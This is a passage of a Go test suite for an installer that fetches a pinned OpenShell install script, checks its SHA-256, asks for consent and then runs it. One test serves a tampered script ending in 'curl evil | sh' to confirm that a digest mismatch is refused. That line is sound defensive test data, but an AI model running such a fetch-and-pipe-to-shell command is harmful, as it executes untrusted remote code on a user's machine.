// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package openshell_test

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	v1 "github.com/NVIDIA/OpenShell/sdk/go/openshell/v1"

	"github.com/defenseclaw/defenseclaw/internal/openshell"
	"github.com/defenseclaw/defenseclaw/internal/openshell/openshelltest"
)

const fakeScript = "#!/bin/sh\necho installing openshell\n"

type installFixture struct {
	t        *testing.T
	srv      *httptest.Server
	hits     atomic.Int32
	runner   *openshelltest.Runner
	cliPath  string
	tempDir  string
	out      bytes.Buffer
	verified int
	// prepared counts the installer's PrepareUpgrade calls, which a test
	// may replace.
	prepared int
	inst     *openshell.Installer
	// lockDir is the configuration directory of the lifecycle lock the
	// installer takes for an upgrade (Installer.LockLifecycle).
	lockDir string
	// scriptSeen is the script content and mode observed while the
	// installer ran.
	scriptSeen []byte
	scriptMode os.FileMode
}

func sha(b string) string {
	sum := sha256.Sum256([]byte(b))
	return hex.EncodeToString(sum[:])
}

// newInstallFixture serves body as the installer and scripts a machine on
// which the CLI reports existing (empty: not installed) before the
// install and after (empty: still not installed) once the script ran.
func newInstallFixture(t *testing.T, body, existing, after string) *installFixture {
	t.Helper()
	skipOnWindows(t)
	f := &installFixture{t: t, runner: &openshelltest.Runner{}}
	f.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.hits.Add(1)
		if r.URL.Path != "/NVIDIA/OpenShell/"+openshell.InstallerTag+"/install.sh" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(f.srv.Close)
	f.cliPath = filepath.Join(t.TempDir(), "openshell")
	f.tempDir = t.TempDir()
	f.lockDir = t.TempDir()
	version := existing
	if existing != "" {
		writeExecutable(t, f.cliPath)
	}
	f.runner.OnFunc(f.cliPath+" --version", func(context.Context, openshell.Command) ([]byte, error) {
		return []byte(version + "\n"), nil
	})
	f.runner.On("sudo -n true", "", nil)
	f.runner.OnFunc("/bin/sh", func(_ context.Context, c openshell.Command) ([]byte, error) {
		path := c.Args[0]
		data, err := os.ReadFile(path)
		if err != nil {
			t.Errorf("script missing while the installer runs: %v", err)
		}
		info, _ := os.Stat(path)
		f.scriptSeen, f.scriptMode = data, info.Mode().Perm()
		if after != "" {
			writeExecutable(t, f.cliPath)
			version = after
		}
		return nil, nil
	})
	f.inst = &openshell.Installer{
		HTTPClient: f.srv.Client(),
		URL:        f.srv.URL + "/NVIDIA/OpenShell/" + openshell.InstallerTag + "/install.sh",
		SHA256:     sha(body),
		Release:    openshell.InstallerTag,
		TempDir:    f.tempDir,
		Runner:     f.runner,
		LookPath:   func(string) (string, error) { return "", errors.New("not on PATH") },
		Candidates: []string{f.cliPath},
		PackageCLI: f.cliPath,
		GOOS:       "linux",
		// A Mac's checks do not depend on the machine the tests run on.
		BrewPrefix: "/opt/homebrew",
		Writable:   func(string) bool { return true },
		Out:        &f.out,
		Consent: func(p *openshell.InstallPlan) (bool, error) {
			if !strings.Contains(f.out.String(), p.SHA256) {
				t.Errorf("plan was not printed before consent:\n%s", f.out.String())
			}
			return true, nil
		},
		VerifyGateway:         func(context.Context) error { f.verified++; return nil },
		Geteuid:               func() int { return 1000 },
		HomebrewPrefixProblem: func() error { return nil },
		LockLifecycle:         func(ctx context.Context) (func(), error) { return openshell.LockGatewayLifecycle(ctx, f.lockDir) },
		PrepareUpgrade:        func(context.Context, openshell.Version) error { f.prepared++; return nil },
	}
	return f
}

func writeExecutable(t *testing.T, path string) {
	t.Helper()
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
}

func (f *installFixture) ran() bool { return f.runner.Called("/bin/sh") }

// scriptRun returns the installer command, run through /bin/sh.
func (f *installFixture) scriptRun() openshell.Command {
	for _, c := range f.runner.Calls() {
		if c.Name == "/bin/sh" {
			return c
		}
	}
	f.t.Fatal("the installer did not run")
	return openshell.Command{}
}

func (f *installFixture) assertNoLeftovers() {
	f.t.Helper()
	if entries, err := os.ReadDir(f.tempDir); err != nil || len(entries) != 0 {
		f.t.Fatalf("installer left files behind in %s: %v, %v", f.tempDir, entries, err)
	}
}

func TestInstallFresh(t *testing.T) {
	// Inherited variables the pinned script reads: the release, the
	// method, the CLI it registers the gateway with, a test switch that
	// makes it a no-op.
	inherited := []string{"OPENSHELL_VERSION", "OPENSHELL_ACK_BREAKING_UPGRADE", "OPENSHELL_INSTALL_METHOD", "OPENSHELL_REGISTER_BIN",
		"OPENSHELL_INSTALL_SH_TEST", "OPENSHELL_TEST_LDD_OUTPUT", "OPENSHELL_SNAP_TLS_DIR"}
	for _, v := range inherited {
		t.Setenv(v, "inherited")
	}
	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
	res, err := f.inst.Install(context.Background())
	if err != nil || !res.Installed || res.CLIVersion.String() != openshell.InstallerVersion || f.verified != 1 {
		t.Fatalf("Install = %+v, %v (gateway verified %d times)", res, err, f.verified)
	}
	if string(f.scriptSeen) != fakeScript || f.scriptMode != 0o600 {
		t.Fatalf("script run = %q mode %04o, want the verified bytes 0600", f.scriptSeen, f.scriptMode)
	}
	run := f.scriptRun()
	if !slices.Equal(run.Env, []string{"OPENSHELL_VERSION=" + openshell.InstallerTag, "OPENSHELL_REGISTER_BIN=" + f.cliPath}) {
		t.Fatalf("installer env = %v", run.Env)
	}
	for _, v := range inherited {
		if !slices.Contains(run.Unset, v) {
			t.Errorf("inherited %s is not dropped: %v", v, run.Unset)
		}
	}
	plan := f.out.String()
	for _, want := range []string{openshell.InstallerTag, f.inst.URL, sha(fakeScript), "OPENSHELL_VERSION=" + openshell.InstallerTag + " OPENSHELL_REGISTER_BIN=" + f.cliPath + " /bin/sh "} {
		if !strings.Contains(plan, want) {
			t.Errorf("plan lacks %q:\n%s", want, plan)
		}
	}
	if strings.Contains(plan, "ACK_BREAKING") {
		t.Errorf("fresh install plan acknowledges a breaking upgrade:\n%s", plan)
	}
	f.assertNoLeftovers()
}

// TestInstallChecksSudoFirst (GAP-0056, GAP-0064): as an account without
// sudo rights the Linux install printed its plan, ran NVIDIA's script,
// which downloaded the packages and asked for a password three times, and
// failed with "installer failed: /bin/sh: exit status 1"; a Ctrl-C at that
// prompt ended DefenseClaw without a word and left its temporary directory
// behind. Sudo is checked after consent and before the script: refused or
// cancelled, the install is ErrSudo with nothing run or left behind.
func TestInstallChecksSudoFirst(t *testing.T) {
	for name, answer := range map[string]error{
		"refused":   errors.New("exit status 1"),
		"cancelled": fmt.Errorf("sudo: %w", openshell.ErrInterrupted),
	} {
		t.Run(name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
			f.runner.On("sudo -n true", "sudo: a password is required", errors.New("exit status 1"))
			f.runner.On("sudo -v", "", answer)
			_, err := f.inst.Install(context.Background())
			if !errors.Is(err, openshell.ErrSudo) || f.ran() {
				t.Fatalf("Install = %v (script ran %v), want ErrSudo before the script", err, f.ran())
			}
			if name == "cancelled" && !strings.Contains(err.Error(), "cancelled at sudo's password prompt") {
				t.Fatalf("err = %v", err)
			}
			f.assertNoLeftovers()
		})
	}
	// An installer the user interrupts says so, and leaves nothing behind.
	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
	f.runner.On("/bin/sh", "", fmt.Errorf("/bin/sh: %w", openshell.ErrInterrupted))
	if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrInterrupted) || !strings.Contains(err.Error(), "the installer was interrupted") {
		t.Fatalf("Install = %v, want the interruption", err)
	}
	f.assertNoLeftovers()
}

func TestInstallRefusesDigestMismatch(t *testing.T) {
	f := newInstallFixture(t, fakeScript+"curl evil | sh\n", "", "openshell "+openshell.InstallerVersion)
	f.inst.SHA256 = sha(fakeScript)
	consented := false
	f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { consented = true; return true, nil }
	_, err := f.inst.Install(context.Background())
	var mismatch *openshell.DigestMismatchError
	if !errors.Is(err, openshell.ErrDigestMismatch) || !errors.As(err, &mismatch) || mismatch.Got != sha(fakeScript+"curl evil | sh\n") {
		t.Fatalf("Install = %v (%+v), want ErrDigestMismatch", err, mismatch)
	}
	if consented || f.ran() || f.out.Len() != 0 {
		t.Fatalf("a mismatched script reached consent=%v run=%v plan=%q", consented, f.ran(), f.out.String())
	}
	f.assertNoLeftovers()
}

// TestInstallRefusals covers installs that stop before the script runs.
func TestInstallRefusals(t *testing.T) {
	for _, tc := range []struct {
		name    string
		mutate  func(f *installFixture)
		wantIs  error
		wantErr string
	}{
		{"http url", func(f *installFixture) { f.inst.URL = strings.Replace(f.inst.URL, "https://", "http://", 1) }, nil, "must be https"},
		{"not found", func(f *installFixture) { f.inst.URL = f.srv.URL + "/missing.sh" }, nil, "HTTP 404"},
		{"too large", func(f *installFixture) { f.inst.MaxScriptBytes = 8 }, nil, "exceeds 8 bytes"},
		{"declined", func(f *installFixture) {
			f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { return false, nil }
		}, openshell.ErrInstallDeclined, ""},
		// Without a consent callback nothing is even downloaded.
		{"no consent callback", func(f *installFixture) { f.inst.Consent = nil }, nil, ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
			tc.mutate(f)
			_, err := f.inst.Install(context.Background())
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) || (tc.wantIs != nil && !errors.Is(err, tc.wantIs)) {
				t.Fatalf("Install = %v, want %q (%v)", err, tc.wantErr, tc.wantIs)
			}
			if f.ran() || (f.inst.Consent == nil && f.hits.Load() != 0) {
				t.Fatalf("installer ran %v after %d downloads", f.ran(), f.hits.Load())
			}
			f.assertNoLeftovers()
		})
	}
}

// TestInstallExistingReleases: Install keeps a supported OpenShell
// (openshell.SupportedMin or later) and refuses a newer minor. One older
// than SupportedMin runs no sandbox, and Install upgrades it in place
// (the owner's 0.1.5 floor): each legacy release DefenseClaw 1.0.0 to 1.0.3
// left a host on (0.1.1 to 0.1.4), each prerelease of 0.1.5 however it is
// reported, and the older releases the installer upgrades in place. Every
// in-place upgrade runs PrepareUpgrade before the script, which restarts
// the gateway.
func TestInstallExistingReleases(t *testing.T) {
	type row struct {
		name, existing string
		installed      bool
		unsupported    bool
		downloads      int32
	}
	rows := []row{
		{name: "supported is kept", existing: "openshell " + openshell.SupportedMin},
		{name: "a later supported release is kept", existing: "openshell 0.1.9"},
		{name: "a prerelease of a later release is kept", existing: "openshell 0.1.6-pre.1"},
		{name: "newer minor refused", existing: "openshell 0.2.0", unsupported: true},
		{name: "0.1.0 upgraded in place", existing: "openshell 0.1.0", installed: true, downloads: 1},
		// As doctor advises: 0.0.37 and later need no cleanup.
		{name: "0.0.40 upgraded in place", existing: "openshell 0.0.40", installed: true, downloads: 1},
	}
	for _, legacy := range []string{"0.1.1", "0.1.2", "0.1.3", "0.1.4", "0.1.1-1", "0.1.5-pre.1", "0.1.5-pre.3", "0.1.5-pre.4", "0.1.5-dev.7+gabc"} {
		rows = append(rows, row{name: "legacy " + legacy + " upgraded in place", existing: "openshell " + legacy, installed: true, downloads: 1})
	}
	for _, tc := range rows {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, tc.existing, "openshell "+openshell.InstallerVersion)
			res, err := f.inst.Install(context.Background())
			var u *openshell.ErrUnsupportedVersion
			if tc.unsupported != errors.As(err, &u) || (!tc.unsupported && (err != nil || res.Installed != tc.installed)) {
				t.Fatalf("Install = %+v, %v", res, err)
			}
			if got := f.hits.Load(); got != tc.downloads {
				t.Fatalf("downloads = %d, want %d", got, tc.downloads)
			}
			// The script restarts the gateway only after PrepareUpgrade.
			if want := map[bool]int{true: 1, false: 0}[tc.installed]; f.prepared != want {
				t.Fatalf("PrepareUpgrade ran %d times, want %d", f.prepared, want)
			}
			if tc.installed && !strings.Contains(f.out.String(), "upgrades the installed "+tc.existing+" to "+openshell.InstallerTag+" in place") {
				t.Fatalf("plan lacks the in-place note:\n%s", f.out.String())
			}
			if strings.Contains(f.out.String(), "ACK_BREAKING") {
				t.Fatalf("an in-place upgrade acknowledges a breaking one:\n%s", f.out.String())
			}
		})
	}
}

// TestInstallUpgradesInPlace: Install keeps a supported CLI, and Upgrade
// runs the pinned installer over one older than the release once
// PrepareUpgrade has readied the gateway for the script's restart, after
// consent. It never downgrades, refuses a CLI the package would not
// replace, and fails when the old CLI still answers afterwards.
func TestInstallUpgradesInPlace(t *testing.T) {
	setup := func(t *testing.T, existing, after string) (*installFixture, *int) {
		f := newInstallFixture(t, fakeScript, existing, after)
		f.inst.Release = openshell.InstallerTag
		consented, prepared := false, new(int)
		consent := f.inst.Consent
		f.inst.Consent = func(p *openshell.InstallPlan) (bool, error) { consented = true; return consent(p) }
		f.inst.PrepareUpgrade = func(_ context.Context, release openshell.Version) error {
			if f.ran() || !consented || release.String() != openshell.InstallerVersion {
				t.Errorf("prepared for %s with the script run %v, consent %v", release, f.ran(), consented)
			}
			*prepared++
			return nil
		}
		return f, prepared
	}
	t.Run("upgraded", func(t *testing.T) {
		f, prepared := setup(t, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
		res, err := f.inst.Upgrade(context.Background())
		if err != nil || !res.Installed || res.CLIVersion.String() != openshell.InstallerVersion || *prepared != 1 || f.verified != 1 {
			t.Fatalf("Upgrade = %+v, %v (prepared %d, gateway verified %d)", res, err, *prepared, f.verified)
		}
		if env := f.scriptRun().Env; !slices.Equal(env, []string{"OPENSHELL_VERSION=" + openshell.InstallerTag, "OPENSHELL_REGISTER_BIN=" + f.cliPath}) {
			t.Fatalf("installer env = %v", env)
		}
		for _, want := range []string{"upgrades the installed openshell 0.1.1 to " + openshell.InstallerTag + " in place",
			"the script restarts the OpenShell gateway once the release is installed, which drops the connections of every sandbox on it",
			"on the docker driver, Docker pulls the release's supervisor images from ghcr.io",
			"on the MicroVM driver, nothing runs while a sandbox does"} {
			if !strings.Contains(f.out.String(), want) {
				t.Errorf("plan lacks %q:\n%s", want, f.out.String())
			}
		}
		f.assertNoLeftovers()
	})
	// GAP-0072: a Mac runs sandboxes in MicroVMs; its plan has no
	// docker-driver note.
	t.Run("upgraded on a Mac", func(t *testing.T) {
		f, _ := setup(t, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
		f.inst.GOOS, f.inst.E2fsprogsDirs = "darwin", []string{t.TempDir()}
		if _, err := f.inst.Upgrade(context.Background()); err != nil {
			t.Fatal(err)
		}
		plan := f.out.String()
		if !strings.Contains(plan, "which stops every MicroVM sandbox on it") || !strings.Contains(plan, "nothing runs while a MicroVM sandbox does") ||
			strings.Contains(plan, "ghcr.io") || strings.Contains(plan, "docker driver") {
			t.Fatalf("plan:\n%s", plan)
		}
	})
	// A legacy release runs no sandbox: Install upgrades it in place too,
	// through the same PrepareUpgrade, and a refusal there runs nothing.
	t.Run("Install upgrades a legacy one", func(t *testing.T) {
		f, prepared := setup(t, "openshell 0.1.3", "openshell "+openshell.InstallerVersion)
		if res, err := f.inst.Install(context.Background()); err != nil || !res.Installed || f.hits.Load() != 1 || !f.ran() || *prepared != 1 {
			t.Fatalf("Install = %+v, %v (downloads %d, prepared %d)", res, err, f.hits.Load(), *prepared)
		}
		if !strings.Contains(f.out.String(), "upgrades the installed openshell 0.1.3 to "+openshell.InstallerTag+" in place") {
			t.Fatalf("plan:\n%s", f.out.String())
		}
	})
	t.Run("Install of a legacy one waits for a MicroVM", func(t *testing.T) {
		f, _ := setup(t, "openshell 0.1.3", "openshell "+openshell.InstallerVersion)
		f.inst.PrepareUpgrade = func(context.Context, openshell.Version) error { return openshell.ErrSandboxesRunning }
		if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrSandboxesRunning) || f.ran() {
			t.Fatalf("Install = %v (ran %v)", err, f.ran())
		}
	})
	t.Run("Install keeps a supported one", func(t *testing.T) {
		f, prepared := setup(t, "openshell "+openshell.SupportedMin, "openshell 0.1.9")
		if res, err := f.inst.Install(context.Background()); err != nil || res.Installed || f.hits.Load() != 0 || f.ran() || *prepared != 0 {
			t.Fatalf("Install = %+v, %v (downloads %d, prepared %d)", res, err, f.hits.Load(), *prepared)
		}
	})
	for _, existing := range []string{"openshell " + openshell.InstallerVersion, "openshell 0.1.9"} {
		t.Run("never downgrades "+existing, func(t *testing.T) {
			f, prepared := setup(t, existing, "openshell "+openshell.InstallerVersion)
			if res, err := f.inst.Upgrade(context.Background()); err != nil || res.Installed || f.hits.Load() != 0 || f.ran() || *prepared != 0 {
				t.Fatalf("Upgrade = %+v, %v (downloads %d, prepared %d)", res, err, f.hits.Load(), *prepared)
			}
		})
	}
	for _, refusal := range []error{openshell.ErrSandboxesRunning, openshell.ErrRuntimeImages} {
		t.Run("refused: "+refusal.Error(), func(t *testing.T) {
			f, _ := setup(t, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
			f.inst.PrepareUpgrade = func(context.Context, openshell.Version) error { return refusal }
			if _, err := f.inst.Upgrade(context.Background()); !errors.Is(err, refusal) || f.ran() {
				t.Fatalf("Upgrade = %v (ran %v)", err, f.ran())
			}
			f.assertNoLeftovers()
		})
	}
	t.Run("installed another way", func(t *testing.T) {
		f, prepared := setup(t, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
		f.inst.PackageCLI = filepath.Join(t.TempDir(), "openshell")
		if _, err := f.inst.Upgrade(context.Background()); !errors.Is(err, openshell.ErrUnmanagedUpgrade) || !strings.Contains(err.Error(), "the way you installed it") ||
			f.hits.Load() != 0 || f.ran() || *prepared != 0 {
			t.Fatalf("Upgrade = %v (downloads %d, prepared %d)", err, f.hits.Load(), *prepared)
		}
	})
	t.Run("the old CLI still answers", func(t *testing.T) {
		f, _ := setup(t, "openshell 0.1.1", "")
		if _, err := f.inst.Upgrade(context.Background()); err == nil || !strings.Contains(err.Error(), `reports "openshell 0.1.1"`) {
			t.Fatalf("Upgrade = %v", err)
		}
	})
}

// TestUpgradeHoldsTheLifecycleLock: NVIDIA's script restarts the gateway
// minutes after PrepareUpgrade's check, and a sandbox DefenseClaw started
// meanwhile was stopped by that restart without a flush. The upgrade now
// holds the lifecycle lock from the check to the healthy gateway, so
// DefenseClaw's create and start are refused throughout and allowed
// again after it; one in flight when the upgrade begins makes it wait,
// and one held past the wait refuses the upgrade with nothing run.
func TestUpgradeHoldsTheLifecycleLock(t *testing.T) {
	f := newInstallFixture(t, fakeScript, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
	f.inst.Release = openshell.InstallerTag
	var during []error
	starts := func() { _, err := openshell.LockSandboxStart(f.lockDir); during = append(during, err) }
	f.inst.PrepareUpgrade = func(context.Context, openshell.Version) error { starts(); return nil }
	f.inst.VerifyGateway = func(context.Context) error { f.verified++; starts(); return nil }
	if _, err := f.inst.Upgrade(context.Background()); err != nil {
		t.Fatal(err)
	}
	if len(during) != 2 || !errors.Is(during[0], openshell.ErrGatewayBusy) || !errors.Is(during[1], openshell.ErrGatewayBusy) || !f.ran() {
		t.Fatalf("a start during the check and after the script: %v (script ran %v)", during, f.ran())
	}
	unlock, err := openshell.LockSandboxStart(f.lockDir)
	if err != nil {
		t.Fatalf("a start after the upgrade: %v", err)
	}

	// A start in flight: the upgrade waits for it, and refuses once the
	// wait is over, with nothing run.
	openshell.SetLifecycleLockWait(t, 300*time.Millisecond)
	g := newInstallFixture(t, fakeScript, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
	g.inst.Release, g.lockDir = openshell.InstallerTag, f.lockDir
	prepared := false
	g.inst.PrepareUpgrade = func(context.Context, openshell.Version) error { prepared = true; return nil }
	if _, err := g.inst.Upgrade(context.Background()); !errors.Is(err, openshell.ErrGatewayBusy) || prepared || g.ran() {
		t.Fatalf("an upgrade under a start in flight: %v (prepared %v, script ran %v)", err, prepared, g.ran())
	}
	unlock()
	if _, err := g.inst.Upgrade(context.Background()); err != nil || !prepared {
		t.Fatalf("the upgrade once the start ended: %v (prepared %v)", err, prepared)
	}
}

// TestPrepareUpgrade: NVIDIA's script restarts the gateway only once it
// has downloaded and installed the release. On the docker driver, whose
// sandboxes keep running, the release's supervisor images are pulled
// first, as the restarted gateway does not start without them; on the
// MicroVM driver a running or starting sandbox, of any owner, refuses the
// upgrade, as a flush that early would leave minutes of writes to be lost.
// A gateway whose driver could not be read counts as a MicroVM one, and
// only one that answers neither call as down.
func TestPrepareUpgrade(t *testing.T) {
	gateway := func(t *testing.T, d openshell.ComputeDriver, phases map[string]openshell.SandboxPhase) (openshell.Client, *openshelltest.Fake) {
		t.Helper()
		f := openshelltest.New(openshelltest.WithDriver(d))
		c := f.Client(openshell.ClientOptions{})
		for name, phase := range phases {
			if _, err := c.CreateSandbox(context.Background(), name, &openshell.SandboxSpec{}, openshell.CreateSandboxOptions{}); err != nil {
				t.Fatal(err)
			}
			if err := f.SetPhase(openshell.DefaultWorkspace, name, phase); err != nil {
				t.Fatal(err)
			}
		}
		return c, f
	}
	running := map[string]openshell.SandboxPhase{"dc-b": openshell.PhaseProvisioning, "dc-a": openshell.PhaseReady, "dc-c": openshell.PhaseStopped}
	pulls := 0
	pull := func(context.Context) error { pulls++; return nil }
	unavailable := &v1.StatusError{Code: v1.ErrorUnavailable, Message: "connection refused"}

	c, _ := gateway(t, openshell.DriverDocker, running)
	if err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs); err != nil || pulls != 1 {
		t.Fatalf("docker: %v, pulled %d times", err, pulls)
	}
	pullErr := fmt.Errorf("%w (docker pull: offline)", openshell.ErrRuntimeImages)
	if err := openshell.PrepareUpgrade(context.Background(), c, func(context.Context) error { return pullErr }, noMicroVMs); !errors.Is(err, openshell.ErrRuntimeImages) {
		t.Fatalf("docker, pull failed: %v", err)
	}

	pulls = 0
	c, _ = gateway(t, openshell.DriverVM, running)
	err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs)
	if !errors.Is(err, openshell.ErrSandboxesRunning) || !strings.Contains(err.Error(), "dc-a (ready): `defenseclaw sandbox stop dc-a` (DefenseClaw sandbox), or `openshell sandbox stop dc-a` (raw OpenShell sandbox); dc-b (provisioning): wait until") || pulls != 0 {
		t.Fatalf("vm, sandboxes running: %v (pulled %d times)", err, pulls)
	}
	c, _ = gateway(t, openshell.DriverVM, map[string]openshell.SandboxPhase{"dc-c": openshell.PhaseStopped})
	if err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs); err != nil || pulls != 0 {
		t.Fatalf("vm, none running: %v (pulled %d times)", err, pulls)
	}

	c, f := gateway(t, openshell.DriverVM, running)
	f.FailNext(openshelltest.MethodGatewayInfo, &v1.StatusError{Code: v1.ErrorDeadlineExceeded, Message: "context deadline exceeded"})
	if err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs); !errors.Is(err, openshell.ErrSandboxesRunning) || pulls != 0 {
		t.Fatalf("driver unknown, sandboxes running: %v (pulled %d times)", err, pulls)
	}
	c, f = gateway(t, openshell.DriverVM, running)
	f.FailNext(openshelltest.MethodGatewayInfo, &v1.StatusError{Code: v1.ErrorDeadlineExceeded, Message: "context deadline exceeded"})
	f.FailNext(openshelltest.MethodListSandboxes, &v1.StatusError{Code: v1.ErrorInternal, Message: "store locked"})
	if err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs); !errors.Is(err, openshell.ErrSandboxesRunning) || !strings.Contains(err.Error(), "could not be listed: ") {
		t.Fatalf("driver unknown, list failed: %v", err)
	}
	c, f = gateway(t, openshell.DriverVM, running)
	f.FailNext(openshelltest.MethodGatewayInfo, unavailable)
	f.FailNext(openshelltest.MethodListSandboxes, unavailable)
	if err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs); err != nil || pulls != 0 {
		t.Fatalf("gateway down: %v (pulled %d times)", err, pulls)
	}
}

// TestPullRuntimeImages: the images the upgraded gateway's docker driver
// starts with are the release's on ghcr.io, but those gateway.toml
// replaces. A local one is not pulled again, and a pull that fails says
// which image and what to do.
func TestPullRuntimeImages(t *testing.T) {
	// The images, not the file owner: Windows has no owner check that passes.
	openshell.SetGatewayFileOwner(t, func(fs.FileInfo) bool { return true })
	v, _ := openshell.ParseVersion(openshell.InstallerVersion)
	supervisor := "ghcr.io/nvidia/openshell/supervisor:" + openshell.InstallerVersion
	sandbox := "ghcr.io/nvidia/openshell/sandbox:" + openshell.InstallerVersion
	var none *openshell.GatewayConfigState
	if got := none.RuntimeImages(v); !slices.Equal(got, []string{supervisor, sandbox}) {
		t.Fatalf("no configuration: %v", got)
	}
	for toml, want := range map[string][]string{
		"[openshell.drivers.docker]\nsupervisor_image = \"mirror.example/supervisor:1\"\n":    {sandbox},
		"[openshell.drivers.docker]\nsandbox_runtime_image = \"mirror.example/sandbox:1\"\n":  {supervisor},
		"[openshell.drivers.docker]\nsupervisor_bin = \"/opt/openshell/openshell-sandbox\"\n": {supervisor},
		"[openshell.gateway]\ncompute_driver = \"docker\"\n":                                  {supervisor, sandbox},
	} {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, "gateway.toml"), []byte(toml), 0o600); err != nil {
			t.Fatal(err)
		}
		st, err := (&openshell.GatewayConfigurator{Dir: dir, GOOS: "linux", Runner: &openshelltest.Runner{}}).Read()
		if err != nil {
			t.Fatal(err)
		}
		if got := st.RuntimeImages(v); !slices.Equal(got, want) {
			t.Errorf("%q: %v, want %v", toml, got, want)
		}
	}

	r := &openshelltest.Runner{}
	r.On("docker image inspect", "", errors.New("exit status 1")) // the last rule that matches answers
	r.On("docker image inspect --format {{.Id}} "+supervisor, "sha256:1\n", nil)
	r.On("docker pull "+sandbox, "", nil)
	if err := openshell.PullRuntimeImages(context.Background(), r, []string{supervisor, sandbox}); err != nil || r.Called("docker pull "+supervisor) || !r.Called("docker pull "+sandbox) {
		t.Fatalf("pull: %v, calls %v", err, r.Calls())
	}
	r = &openshelltest.Runner{}
	r.On("docker image inspect", "", errors.New("exit status 1"))
	r.On("docker pull", "Error response from daemon: Get \"https://ghcr.io/v2/\": dial tcp: lookup ghcr.io: no such host\n", errors.New("exit status 1"))
	err := openshell.PullRuntimeImages(context.Background(), r, []string{supervisor, sandbox})
	if !errors.Is(err, openshell.ErrRuntimeImages) || !strings.Contains(err.Error(), "docker pull "+supervisor+": exit status 1: Error response from daemon") ||
		!strings.Contains(err.Error(), "let Docker reach ghcr.io, or load the image, then upgrade") || r.Called("docker pull "+sandbox) {
		t.Fatalf("pull offline: %v", err)
	}
}

func TestInstallBreakingUpgrade(t *testing.T) {
	for _, existing := range []string{"openshell 0.0.16", "openshell (build 1f2e)"} {
		t.Run(existing, func(t *testing.T) {
			// No confirmation callback: refused, with the cleanup explained.
			f := newInstallFixture(t, fakeScript, existing, "openshell "+openshell.InstallerVersion)
			if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() ||
				!strings.Contains(f.out.String(), "openshell sandbox delete --all && openshell gateway destroy") {
				t.Fatalf("Install = %v (ran %v), plan:\n%s", err, f.ran(), f.out.String())
			}
			f.assertNoLeftovers()

			f = newInstallFixture(t, fakeScript, existing, "openshell "+openshell.InstallerVersion)
			f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return false, nil }
			if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() {
				t.Fatalf("declined: Install = %v (ran %v)", err, f.ran())
			}

			f = newInstallFixture(t, fakeScript, existing, "openshell "+openshell.InstallerVersion)
			var confirmed *openshell.InstallPlan
			f.inst.ConfirmBreakingUpgrade = func(p *openshell.InstallPlan) (bool, error) { confirmed = p; return true, nil }
			if res, err := f.inst.Install(context.Background()); err != nil || !res.Installed || confirmed == nil || !confirmed.BreakingUpgrade {
				t.Fatalf("confirmed: Install = %+v, %v (plan %+v)", res, err, confirmed)
			}
			if env := f.scriptRun().Env; !slices.Contains(env, "OPENSHELL_ACK_BREAKING_UPGRADE=1") {
				t.Fatalf("installer env = %v", env)
			}
		})
	}
}

// TestInstallReplacesLegacyCLI covers a pre-0.0.37 CLI in ~/.local/bin,
// which comes before the package's CLI on PATH and which the package does
// not replace: the plan says to remove it, the script registers the
// gateway with the package's CLI, and an install that leaves the old CLI
// first on PATH is reported, not passed.
func TestInstallReplacesLegacyCLI(t *testing.T) {
	setup := func(t *testing.T) (*installFixture, string) {
		f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
		legacy := filepath.Join(t.TempDir(), "openshell")
		writeExecutable(t, legacy)
		f.runner.On(legacy+" --version", "openshell 0.0.36\n", nil)
		f.inst.LookPath = func(string) (string, error) {
			if _, err := os.Stat(legacy); err != nil {
				return "", err
			}
			return legacy, nil
		}
		f.inst.Candidates = []string{legacy, f.cliPath}
		f.inst.ConfirmBreakingUpgrade = func(p *openshell.InstallPlan) (bool, error) { return true, nil }
		return f, legacy
	}
	t.Run("left in place", func(t *testing.T) {
		f, legacy := setup(t)
		_, err := f.inst.Install(context.Background())
